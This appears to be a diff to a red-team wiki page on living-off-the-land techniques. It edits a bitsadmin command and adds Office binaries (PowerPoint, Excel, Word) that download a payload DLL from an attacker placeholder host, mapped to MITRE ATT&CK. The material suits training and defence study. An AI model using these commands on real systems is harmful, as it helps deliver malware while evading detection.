@@ -26,7 +26,7 @@ The bitsadmin tool is a system administrator utility that can be used to create,
 
 ```bash
 #Dowload a file
-bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\Pwned\Desktop\payload.exe
+bitsadmin.exe /transfer /Download /priority Foreground http://<ATTACKER_IP>/payload.exe c:\Users\Pwned\Desktop\payload.exe
 ```
 
 The MITRE ATT\&CK framework identifies this technique as [BITS Job (T1197)](https://attack.mitre.org/techniques/T1197/)
@@ -42,6 +42,21 @@ findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test
 
 he MITRE ATT\&CK framework identifies this technique as [Ingress tool transfer (T1105)](https://attack.mitre.org/techniques/T1105/)
 {% endtab %}
+
+{% tab title="Office Binaries" %}
+We may use binaries part of Office 365 (Word, Excel, Powerpoint) to download malicious payloads. It will download a remote payload and place it in the cache folder
+
+```powershell
+#Dowload a file using PowerPoint
+Powerpnt.exe "http://<ATTACKING_IP>/TeamsAddinLoader.dll"
+
+#Dowload a file using Excel
+Excel.exe http://<ATTACKING_IP>/TeamsAddinLoader.dll
+
+#Dowload a file using Word
+winword.exe "http://<ATTACKING_IP>/TeamsAddinLoader.dll"
+```
+{% endtab %}
 {% endtabs %}
 
 {% hint style="danger" %}
@@ -51,4 +66,5 @@ Note that other tools can be used for file operations. We suggest visiting the [
 ## References
 
 {% embed url="https://tryhackme.com/room/livingofftheland" %}
+
 {% embed url="https://lolbas-project.github.io/#" %}
